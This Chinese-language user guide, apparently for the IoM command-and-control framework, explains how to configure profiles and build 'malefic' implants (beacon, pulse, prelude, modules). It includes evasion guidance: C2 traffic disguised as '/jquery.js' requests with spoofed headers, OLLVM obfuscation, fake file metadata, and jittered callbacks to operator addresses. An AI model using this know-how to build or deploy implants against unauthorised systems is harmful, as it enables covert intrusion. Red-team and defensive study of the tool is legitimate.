---
title: 构建与 Profile
---

在IoM中，implant的相关特性是由编译使用的profile决定的。在编译之前首先要准备好需要的profile。
## profile 准备

!!! info "自动生成 profile"
    目前在pipeline启动时，服务端会自动生成能和该pipeline通信的profile

自定义profile需要先下载 https://github.com/chainreactors/malefic/blob/master/config.yaml 。
profile的配置结构主要分为大部分：

- **basic** ：用于连接的参数配置
     
- **implants** ：implant 的功能性配置
	
- **build** ：构建时的编译及混淆选项
### basic
`basic` 部分主要用于连接参数配置，包括 **目标地址、协议、加密、代理、心跳、HTTP 伪装头** 等。
#### 目标与协议
```yaml
basic:
  name: "malefic"  
  targets:
    - "127.0.0.1:8080"
  protocol: "http"          
```

- `targets` 支持列表，可配置多个目标地址。
    
- `protocol` : 通信协议可以配置为tcp和http。

!!! tip "`targets` 和 `protocol` 必须与 listener 中 pipeline 的通信配置一致"  
    由于 Implant 与 listener 的 pipeline 直接通信，因此 Implant 中的 `targets` 与 `protocol` 配置需要与 pipeline 保持一致。
      
    有关 pipeline 的 TCP 与 HTTP 配置，请参见 [Listener 操作](listener.md)。
#### REM 信道上线

REM 是 IoM 基于[rem](/rem)自定义协议，支持更灵活的流量伪装，其中`link` 格式为`[transport]://[key]:@[host]:[port]?wrapper=[]&tls=[bool]&tlsintls=[bool]&compress=[bool]`, 详细参数请阅读[rem参数解释](https://wiki.chainreactors.red/rem/usage/#console)

```yaml
targets: 
  - address: "127.0.0.1:34996" # REM 服务器地址 
    protocol: "rem" 
    rem: link: "tcp://username:password@127.0.0.1:34996?wrapper=demo123"
    rem: 
      link: "tcp://username:password@127.0.0.1:34996?wrapper=ls..."
```

!!! tip "rem 文档"
    IoM 中的大多数网络功能均依赖 **rem** 实现。为了更高效地使用这些功能，建议在操作前先查阅 [rem](/rem) 文档

#### TLS加密
当通信的pipeline开启了tls，需要在profile中开启 `tls` 配置：
```yaml
  tls:
    enable: true                    # 启用TLS
    version: "auto"                 # TLS版本: "auto", "1.2", "1.3"
    sni: "localhost"                # 服务器名称指示（SNI）
    skip_verification: true
```

!!! tip "TLS 配置"
    您可以在listener的config.yaml中找到tls配置，来确定是否需要打开tls配置。
    listener的pipeline的tls配置可以在[Listener 操作 - TLS](listener.md)查阅。

#### HTTP 请求伪装
当通信协议为http时，您可以配置 HTTP 请求的路径、方法与 Header 信息：
```yaml
basic:
  http:
    method: "POST"  
    path: "/jquery.js"  
    host: "127.0.0.1"  
    version: "1.1"  
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
      Content-Type: "application/octet-stream"
```

- `method` 常见设置为 `POST` 或 `GET`。
    
- `path` 可伪装成静态资源路径，如 `.js`、`.css`、`.png`。
    
- `headers` 支持自定义，建议模仿真实流量特征。

#### Encryption
当通信的pipeline配置了 `Encryption` 信息，profile也需要同步设置  `encryption` 和 `key` 字段 ，两者内容和需要保持一致。

!!! tip "Encryption 配置"
    关于pipeline的Encryption信息，请参阅[Listener 操作 - Encryption](listener.md)

```yaml
basic:
  encryption: aes
  key: maliceofinternal
```

!!! tip "basic 配置"
    有关basic配置的更多信息，请参阅 [构建操作](build.md)

### implants

implant的功能性配置，决定 **运行时行为** 和 **模块加载策略** 。

您可以根据实际需求来配置beacon或者modules的内置模块，以下是一个implants示例:
```yaml
implants:
  modules:                           
    - "execute_all"
    - "sys_all"
```
您也可以将 `modules` 字段设置为 `nano`，这会编译一组预定义的基础功能模块，只包含核心功能，适合最小化 implant 的体积和功能。但请注意，如果后续需要在这个最小 implant 上加载其他模块，必须同时开启 `hot_load` 字段。
```yaml
implants:
  hot_load: true          
  modules:                
    - "nano"
```

如果您需要使用第三方模块，可以开启 `enable_3rd` 并在 `3rd_modules` 中列出需要编译的模块：
```yaml
implants:
  enable_3rd: true
  3rd_modules:
    - "curl"
    - "rem"
```

在编译prelude和beacon类型的implant时，`autorun` 字段用于指定 implant 上线时自动执行的配置文件 autorun.yaml，详细的autorun在 [构建操作](build.md)中有说明。
```yaml
implants:
  autorun: "autorun.yaml"
```

!!! tip "implant 配置"
    有关implant配置的更多信息，请参阅 [构建操作](build.md)

### build

 `build` 主要控制 **构建方式、混淆参数、PE 文件元信息** 等。

这是一个最小的build部分示例：
```yaml
build:
  zigbuild: true                   
  remap: false
  ollvm:
    enable: false                   
  metadata:
    original_filename: "normal.exe"
    file_description: "normal"
    require_admin: true            
```
在这个例子中，`build` 配置包含以下字段：

- **zigbuild** ：是否启用 Zig 编译器来构建 payload。
    
- **remap** ：是否刷新路径映射。
    
- **ollvm.enable** ：是否启用 OLLVM 混淆。
    
- **metadata.original_filename** ：生成的可执行文件原始文件名。
    
- **metadata.file_description** ：文件描述信息。
    
- **metadata.require_admin** ：是否要求管理员权限。

!!! tip "build 配置"
    `build` 部分的ollvm混淆拥有多种设置，也设置更多的自定义元信息字段。有关更多build的配置信息，请参阅 [构建操作](build.md)。

### 新建profile
您也可以使用 `profile new` 新建一个默认的profile，在IoM中，profile是与pipeline绑定的，在编译前，profile中的 `basic` 的 `target` 、 `protocol` 和 `tls` 配置会自动使用pipeline的配置。

```bash
profile new --name new-profile --pipeline tcp
```
### 上传profile
当您需要上传您的自定义profile，可以使用 `profile load` 命令，将您修改后的profile上传到服务端。添加profile时，需要指定一个pipeline，以保证编译出来的implant能和pipeline通信:
```bash
profile load config.yaml --name test --pipeline tcp
```

![image-20250817183127224752](../assets/usage/build/profile_load.png)

在 gui 中添加 profile 时，您需要在artifacts页面上，点击add profile，您可以选择已有的 profile 文件进行加载，也可以直接新建一个默认的profile。
![image-20250817182727224752](../assets/usage/build/profile_new.png)

您已可以点击profile名，查看profile的具体内容。在查看profile的界面，点击edit，即可编辑profile。
![image-20250819182727224752](../assets/usage/build/profile_detail.png)
![image-20250819010527224752](../assets/usage/build/profile_edit.png)
## 编译

准备好profile后，您可以在client端使用build命令进行编译，目前build命令支持编译beacon、pulse、prelude和modules。

!!! info "命令行参数优先级"
    在编译时，命令行内联参数会覆盖 profile 中的同名配置。
    例如 `build beacon --profile tcp_default --addresses tcp://127.0.0.1:5001` 会以命令行提供的地址覆盖 `basic.targets`。

!!! tip "核心概念"
    有关implant的简单介绍可以查看[核心概念](../concept.md)

### 编译命令

```bash
build beacon --profile tcp_default --target x86_64-unknown-linux-musl --source saas
```
在这个示例中，`build` 命令包含以下参数：

- **profile** ：指定要使用的构建配置文件名称，必填项。
    
- **target** ：指定构建目标平台和架构，必填项，例如 `"x86_64-pc-windows-gnu"` 或 `"x86_64-unknown-linux-musl"` 。
    
- **source** ：指定构建来源，可以是 `docker`、`action` 或 `saas` ，若没有指定，则会寻找可用的编译平台来编译 。

!!! tip "target与source说明"
    target架构列表详见 [构建操作](build.md)
    source信息详见 [构建操作](build.md)
#### 编译beacon

 **beacon** 是功能完整的主 Implant，运行在 beacon 模式下。
 
最简命令示例
```bash
build beacon --target x86_64-pc-windows-gnu --profile tcp_default
```

在编译beacon的时候，您可以通过 `--modules` 带上需要添加的额外modules。
```bash
build beacon --target x86_64-pc-windows-gnu --profile tcp_default --modules execute_full
```

您也可以通过 `--interval` 和 `--jitter` 字段来控制beacon和prelude的回连时间，`interval` 参数控制固定回连的时间间隔（秒），`jitter` 参数控制在 interval 基础上增加的随机扰动比例，避免过于规律的回连。

```bash
build beacon --profile tcp_default --target x86_64-unknown-linux-musl --interval 1 --jitter 0.2
```

若您需要在beacon中使用rem插件时，可以使用 `--rem` 来配置。`--rem` 支持两种用法：

```bash
# 通过 pipeline 名自动解析 link
build beacon --profile tcp_default --target x86_64-unknown-linux-musl --addresses tcp://10.0.0.1:5001 --rem rem_default

# 直接指定 link 地址
build beacon --profile tcp_default --target x86_64-unknown-linux-musl --addresses tcp://10.0.0.1:5001 --rem tcp://cdn.example.com:5555
```

!!! tip "更多编译选项"
    更多有关 `build beacon` 命令的编译选项，请参阅 [构建操作](build.md)


    在gui上，您需要在artifacts页面，在对应的profile行上点击build，选择beacon后，根据需求，在对应配置行上填入信息，进行编译。
    ![image-20250817183527224752](../assets/usage/build/build_beacon_gui.png)

#### 编译pulse

**pulse** 是一个轻量级的上线马，体积只有 4KB，功能类似于 CS 的 artifact。

最简命令示例
```bash
build pulse --profile tcp_default --target x86_64-pc-windows-gnu
```

编译pulse时，可以指定`--artifact-id`  来指定pulse链接的beacon。
```bash
build pulse --profile tcp_default --target x86_64-pc-windows-gnu --artifact-id 3
```

!!! tip "更多编译选项"
    更多有关 `build pulse` 命令的编译选项，请参阅 [构建操作](build.md)

    在gui上，您需要在选择pulse后，填入artifact-id后进行编译。

    ![image-20250817184427224752](../assets/usage/build/build_pulse_artifactID_gui.png)

#### 编译prelude

**prelude** 是上线流程的中间 Implant，支持权限维持等功能。

编译prelude时，需要使用 `--autorun` 指定包含autorun.yaml和resources文件夹的zip压缩包路径。
详细的zip压缩格式在[构建操作](build.md)中说明。
编译命令如下：
```bash
build prelude  --profile prelude-profile  --target x86_64-pc-windows-gnu --autorun autorun.zip
```

!!! tip "更多编译选项"
    更多有关 `build prelude` 命令的编译选项，请参阅 [构建操作](build.md)

    在gui上，您需要在选择prelude后，填入zip文件路径后进行编译。

    ![image-20250817185927224752](../assets/usage/build/build_prelude_gui.png)

#### 编译modules

**modules** 是 Malefic 的功能模块集合，便于在运行时按需动态加载。

当您需要编译modules时，可以通过 `--modules` 来指定需要的modules进行编译。
```bash
build modules --modules execute_exe,execute_dll --profile tcp_default --target x86_64-pc-windows-gnu 
```

您也可以使用 `--3rd` 来编译第三方插件，目前Implant支持curl和rem这两个第三方插件。
```bash
build modules --3rd rem --profile tcp_default --target x86_64-pc-windows-gnu
```

!!! tip "更多编译选项"
    更多有关 `build modules` 命令的编译选项，请参阅 [构建操作](build.md)

    在gui上，您需要在选择modules后，在对应的插件行上填入需要的插件，然后进行编译。

    ![image-20250817183827224752](../assets/usage/build/build_modules_gui.png)

    ![image-20250817183927224752](../assets/usage/build/build_3rd_gui.png)

### artifact 

编译完成后，您可以使用 `artifact list` 命令查看所有的artifact。

```bash
artifact list
```

![img_8.png](../assets/artifact_list.png)

在artifact表格中选中对应artifact，即可将artifact源文件下载到client端。

您也可以使用 `artifact download` 来指定想要下载的artifact，也可以指定 `--format` 来设置artifact的下载格式。

例如，下载artifact的shellcode格式：

```bash
artifact download artifact-name --format raw
```
!!! tip "artifact 下载格式"
    更多的format格式， 请参阅[构建操作](build.md)

    在gui上，您需要在artifact页面上点击对应的artifact行上的download按钮，即可下载artifact源文件到指定路径。
    ![image-20250817190327224752](../assets/usage/build/artifact_download.png)

当artifact编译失败时，可以通过以下命令来查看log(目前支持查看docker，后续会加上saas）：

```bash
build log artifact_name
```

![image-20250817192027224752](../assets/usage/build/build_log.png)

在gui中，可以右击对应artifact行，点击Show Artifact Log, 可以查看log。

![image-20250817192327224752](../assets/usage/build/build_log_gui.png)
